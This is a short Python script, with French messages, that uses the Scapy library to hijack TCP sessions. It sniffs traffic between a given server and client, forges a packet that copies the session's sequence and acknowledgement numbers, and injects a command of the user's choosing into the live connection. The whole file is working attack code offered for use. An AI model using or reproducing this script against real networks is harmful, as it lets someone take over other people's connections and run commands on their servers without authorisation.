#Usage: hijackTcp2.py serveur_ip serveur_port client_ip command_cmd
#!usr/bin/env/python

from scapy.all import *
import sys

filtre="host "+sys.argv[1]+" and port "+sys.argv[2]
print "Attente de "+sys.argv[1]+" -> "+sys.argv[3]+" and port "+sys.argv[2]

def hijack(p):
	cmd=sys.argv[4]
	if p[IP].src==sys.argv[1] and p[IP].dst==sys.argv[3]:
		print "trouve!"
		print "Seq: "+str(p[TCP].seq)+" | Ack: "+str(p[TCP].ack)
		print "Hijack Seq: "+str(p[TCP].ack)+" |  Hijack Ack: "+str(p[TCP].seq)
		print "Hijack!!"

		ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
		ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, len=p[IP].len, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=29321)
		tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=p[TCP].options)

		hijack = ether/ip/tcp/(cmd+"\n")
		rcv=sendp(hijack)
		sys.exit()

sniff(count=0,prn = lambda p : hijack(p),filter=filtre,lfilter=lambda(f): f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
